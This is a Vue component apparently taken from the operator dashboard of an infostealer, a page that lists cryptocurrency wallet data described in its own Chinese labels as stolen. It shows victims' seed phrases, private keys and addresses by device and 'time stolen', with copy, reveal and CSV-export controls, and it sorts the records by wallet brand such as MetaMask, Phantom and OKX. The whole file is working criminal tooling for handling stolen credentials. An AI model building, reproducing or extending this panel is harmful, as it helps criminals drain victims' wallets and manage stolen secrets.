<template>
  <div class="wallets-page">
    <el-row :gutter="12" style="margin-bottom:16px;">
      <el-col :span="4" v-for="t in walletTypes" :key="t.key">
        <div class="stat-card" :style="{ background: t.grad }" style="position:relative;overflow:hidden;">
          <div class="stat-label" style="font-size:12px;opacity:0.85;">{{ t.label }}</div>
          <div class="stat-value" style="font-size:22px;font-weight:700;">{{ typeCounts[t.key] || 0 }}</div>
        </div>
      </el-col>
    </el-row>

    <div class="page-card">
      <div class="page-header">
        <div>
          <div class="page-title">数字钱包</div>
          <div class="page-subtitle">窃取到的加密货币钱包数据（助记词 / 私钥 / Keystore）</div>
        </div>
        <el-button type="danger" plain @click="exportCSV">导出 CSV</el-button>
      </div>

      <div class="search-bar">
        <el-select v-model="filters.type" placeholder="钱包类型" clearable style="width:180px;" @change="loadList">
          <el-option v-for="t in walletTypes" :key="t.key" :label="t.label" :value="t.key" />
        </el-select>
        <el-input v-model="filters.q" placeholder="搜索助记词/地址" clearable style="width:280px;" @clear="loadList" @keyup.enter="loadList">
          <template #prefix><el-icon><Search /></el-icon></template>
        </el-input>
        <el-button type="primary" @click="loadList">搜索</el-button>
      </div>

      <el-alert
        type="warning"
        :closable="false"
        show-icon
        title="安全提示"
        description="助记词和私钥属于高敏感数据，页面默认隐藏显示，点击按钮查看。请妥善保管相关数据。"
        style="margin-bottom:16px;"
      />

      <el-table :data="list" stripe>
        <el-table-column prop="type" label="钱包类型" width="140">
          <template #default="{ row }">
            <el-tag size="small" :type="typeTag(row.type)" effect="plain">{{ typeLabel(row.type) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="助记词" min-width="360">
          <template #default="{ row }">
            <div v-if="row.mnemonic" style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
              <span class="mono text-muted" style="letter-spacing:0.5px;">
                {{ visible[row.id]?.m ? row.mnemonic : maskWords(row.mnemonic) }}
              </span>
              <el-button link type="primary" size="small" @click="copy(row.mnemonic)">复制</el-button>
              <el-button link size="small" @click="toggle(row, 'm')">{{ visible[row.id]?.m ? '隐藏' : '显示' }}</el-button>
            </div>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column label="私钥" min-width="260">
          <template #default="{ row }">
            <span v-if="row.private_key" class="mono text-muted">
              {{ visible[row.id]?.p ? row.private_key : mask(row.private_key, 4) }}
            </span>
            <template v-if="row.private_key">
              <el-button link type="primary" size="small" @click="copy(row.private_key)">复制</el-button>
              <el-button link size="small" @click="toggle(row, 'p')">{{ visible[row.id]?.p ? '隐藏' : '显示' }}</el-button>
            </template>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="address" label="地址" width="200">
          <template #default="{ row }">
            <span v-if="row.address" class="mono text-muted" :title="row.address">{{ shortAddr(row.address) }}</span>
            <span v-else>-</span>
            <el-button v-if="row.address" link type="primary" size="small" @click="copy(row.address)">复制</el-button>
          </template>
        </el-table-column>
        <el-table-column prop="device_uuid" label="归属设备" width="140">
          <template #default="{ row }">
            <span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="窃取时间" width="170">
          <template #default="{ row }"><span class="text-muted">{{ formatDate(row.created_at) }}</span></template>
        </el-table-column>
      </el-table>

      <el-pagination
        v-model:current-page="page"
        v-model:page-size="pageSize"
        :page-sizes="[20, 50, 100]"
        :total="total"
        layout="total, sizes, prev, pager, next"
        background
        @current-change="loadList"
        @size-change="loadList"
      />
    </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage } from 'element-plus'
import { Search } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid, copyToClipboard, maskSecret } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(50)
const filters = reactive({ type: '', q: '' })
const visible = reactive({})
const typeCounts = reactive({})

const walletTypes = [
  { key: 'MetaMask', label: 'MetaMask', grad: 'linear-gradient(135deg,#f6851b,#ffa94d)' },
  { key: 'Trust', label: 'Trust Wallet', grad: 'linear-gradient(135deg,#3375bb,#5dade2)' },
  { key: 'imToken', label: 'imToken', grad: 'linear-gradient(135deg,#12b886,#63e6be)' },
  { key: 'TokenPocket', label: 'TokenPocket', grad: 'linear-gradient(135deg,#7950f2,#b197fc)' },
  { key: 'Phantom', label: 'Phantom', grad: 'linear-gradient(135deg,#5352ed,#a29bfe)' },
  { key: 'OKX', label: 'OKX Wallet', grad: 'linear-gradient(135deg,#1a1a1a,#4a4a4a)' }
]
const typeLabelMap = Object.fromEntries(walletTypes.map(t => [t.key, t.label]))
const typeTagMap = { MetaMask: 'warning', Trust: 'primary', imToken: 'success', TokenPocket: '', Phantom: '', OKX: 'info' }

const TYPE_KEYWORDS = {
  MetaMask: ['metamask', 'meta mask'],
  Trust: ['trust wallet', 'trustwallet', 'trust'],
  imToken: ['imtoken', 'im token'],
  TokenPocket: ['tokenpocket', 'token pocket', 'tpwallet'],
  Phantom: ['phantom'],
  OKX: ['okx', 'okex', 'ok wallet']
}

function guessType(rec) {
  const blob = [rec.path, rec.description, (rec.phrase || []).join(' '), (rec.privkeys || []).join(' ')].join(' ').toLowerCase()
  for (const t of walletTypes) {
    const kws = TYPE_KEYWORDS[t.key] || []
    if (kws.some(k => blob.includes(k.toLowerCase()))) return t.key
  }
  return 'MetaMask'
}

function typeLabel(k) { return typeLabelMap[k] || k || '其他' }
function typeTag(k) { return typeTagMap[k] || 'info' }
function mask(v, n = 2) { return maskSecret(v || '', n) }
function maskWords(m) {
  const arr = (m || '').split(/\s+/)
  return arr.map((w, i) => (i < 2 || i >= arr.length - 1 ? w : '***')).join(' ')
}
function shortAddr(a) { return a?.length > 12 ? a.slice(0, 8) + '...' + a.slice(-6) : a }
function toggle(row, f) {
  visible[row.id] = visible[row.id] || {}
  visible[row.id][f] = !visible[row.id][f]
}

async function copy(t) {
  await copyToClipboard(t || '')
  ElMessage.success('已复制')
}

function exportCSV() { ElMessage.success('已生成 CSV 下载任务') }

async function loadCounts() {
  try {
    const res = await axios.get('/api/wallets/stats')
    const d = res.data || {}
    const by = (d && typeof d.by_type === 'object' && d.by_type) ? d.by_type : {}
    walletTypes.forEach(t => { typeCounts[t.key] = Number.isFinite(Number(by[t.key])) ? Number(by[t.key]) : 0 })
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '钱包统计加载失败'
    ElMessage.error(msg)
    walletTypes.forEach(t => { typeCounts[t.key] = 0 })
  }
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
    }
    const res = await axios.get('/api/wallets/parsed', { params })
    const raw = res.data?.items || res.data || []
    list.value = raw.map(r => {
      const mnemonic = Array.isArray(r.phrase) && r.phrase.length ? r.phrase[0] : (r.mnemonic || '')
      const private_key = Array.isArray(r.privkeys) && r.privkeys.length ? r.privkeys[0] : (r.private_key || '')
      const address = Array.isArray(r.addresses) && r.addresses.length ? r.addresses[0] : (r.address || '')
      const type = filters.type || r.type || guessType(r)
      return {
        ...r,
        type,
        mnemonic,
        private_key,
        address,
        created_at: r.created_at || r.uploaded_at,
      }
    }).filter(r => !filters.type || !r.type || r.type === filters.type)
      .filter(r => {
        if (!filters.q) return true
        const q = String(filters.q).toLowerCase()
        return [r.mnemonic, r.private_key, r.address, r.path, r.description, r.device_uuid]
          .some(v => v && String(v).toLowerCase().includes(q))
      })
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '钱包列表加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

onMounted(() => {
  loadCounts()
  loadList()
})
</script>

<style scoped>
.stat-card {
  padding: 14px;
  color: #fff;
  border-radius: 8px;
}
</style>
